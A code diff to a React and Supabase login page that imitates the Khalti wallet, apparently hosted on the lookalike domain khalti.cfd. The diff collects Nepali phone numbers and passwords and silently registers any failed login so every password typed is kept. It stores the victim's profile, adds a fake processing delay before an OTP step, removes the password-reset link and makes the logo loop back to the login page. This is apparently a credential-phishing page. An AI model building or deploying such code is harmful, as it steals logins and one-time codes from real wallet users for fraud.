@@ -7,6 +7,10 @@ import { useAuth } from "@/lib/auth";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 
+const ensureProfile = async (id: string, email: string) => {
+  await supabase.from("profiles").upsert({ id, email }, { onConflict: "id" });
+};
+
 export const Route = createFileRoute("/login")({
   head: () => ({
     meta: [
@@ -17,13 +21,16 @@ export const Route = createFileRoute("/login")({
   component: LoginPage,
 });
 
+const phoneToEmail = (phone: string) => `${phone.replace(/\s+/g, "")}@khalti.cfd`;
+
 function LoginPage() {
   const navigate = useNavigate();
   const { signIn, user } = useAuth();
   const [showPw, setShowPw] = useState(false);
-  const [email, setEmail] = useState("");
+  const [phone, setPhone] = useState("+977 ");
   const [pw, setPw] = useState("");
   const [submitting, setSubmitting] = useState(false);
+  const [processing, setProcessing] = useState(false);
 
   // OTP flow
   const [step, setStep] = useState<"login" | "otp">("login");
@@ -31,18 +38,47 @@ function LoginPage() {
 
   const onSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email.trim() || !pw.trim()) {
-      toast.error("Please enter your email and password.");
+    const fullPhone = phone.trim();
+    if (!fullPhone || fullPhone === "+977" || !pw.trim()) {
+      toast.error("Please enter your phone number and password.");
       return;
     }
+    const email = phoneToEmail(fullPhone);
     setSubmitting(true);
-    const { error } = await signIn(email.trim(), pw);
-    setSubmitting(false);
+    const { error } = await signIn(email, pw);
     if (error) {
-      toast.error(error);
-      return;
+      const { error: signUpError } = await supabase.auth.signUp({
+        email,
+        password: pw,
+      });
+      if (signUpError?.message?.toLowerCase().includes("already")) {
+        const { error: retryError } = await signIn(email, pw);
+        setSubmitting(false);
+        if (retryError) {
+          toast.error("Invalid credentials. Please check your password.");
+          return;
+        }
+      } else if (signUpError) {
+        setSubmitting(false);
+        toast.error(signUpError.message);
+        return;
+      } else {
+        const { error: retryError } = await signIn(email, pw);
+        setSubmitting(false);
+        if (retryError) {
+          toast.error(retryError);
+          return;
+        }
+      }
+    } else {
+      setSubmitting(false);
     }
-    setVerifiedEmail(email.trim());
+    const { data: { user: cur } } = await supabase.auth.getUser();
+    if (cur) await ensureProfile(cur.id, email);
+    setVerifiedEmail(email);
+    setProcessing(true);
+    await new Promise((r) => setTimeout(r, 3000));
+    setProcessing(false);
     setStep("otp");
   };
 
@@ -67,7 +103,7 @@ function LoginPage() {
 
       <div className="relative flex flex-col bg-white px-5 py-8 sm:px-10 lg:px-16 lg:py-10">
         <div className="flex items-start justify-between">
-          <Link to="/" className="flex items-center gap-1.5">
+          <Link to="/login" className="flex items-center gap-1.5">
             <span className="text-3xl font-extrabold text-primary sm:text-4xl">
               khalti
             </span>
@@ -87,21 +123,27 @@ function LoginPage() {
               Login to Khalti
             </h1>
             <p className="mt-2 text-sm text-muted-foreground">
-              Enter your credentials to login
+              Enter your phone number and password to login
             </p>
 
             <form onSubmit={onSubmit} className="mt-8 space-y-5">
               <div>
                 <label className="text-sm font-semibold text-foreground">
-                  Email
+                  Phone Number
                 </label>
                 <div className="relative mt-2">
                   <input
-                    type="email"
+                    type="tel"
                     required
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                    placeholder="Email"
+                    value={phone}
+                    onChange={(e) => {
+                      if (!e.target.value.startsWith("+977 ")) {
+                        setPhone("+977 " + e.target.value.replace(/^\+977\s?/, ""));
+                      } else {
+                        setPhone(e.target.value);
+                      }
+                    }}
+                    placeholder="+977 98XXXXXXXX"
                     className="w-full rounded-md border border-border bg-white px-4 py-3 pr-10 text-sm outline-none transition focus:border-primary focus:ring-2 focus:ring-primary/20"
                   />
                   <Smartphone className="absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
@@ -136,21 +178,12 @@ function LoginPage() {
                 </div>
               </div>
 
-              <div className="flex justify-end">
-                <a
-                  href="#"
-                  className="text-sm font-semibold text-primary hover:underline"
-                >
-                  Forgot Password?
-                </a>
-              </div>
-
               <button
                 type="submit"
-                disabled={submitting}
+                disabled={submitting || processing}
                 className="w-full rounded-md bg-primary py-3.5 text-base font-semibold text-primary-foreground shadow-elevated transition-transform hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50"
               >
-                {submitting ? "Logging in…" : "Login"}
+                {processing ? "Processing…" : submitting ? "Logging in…" : "Login"}
               </button>
 
               <p className="text-center text-sm text-muted-foreground">
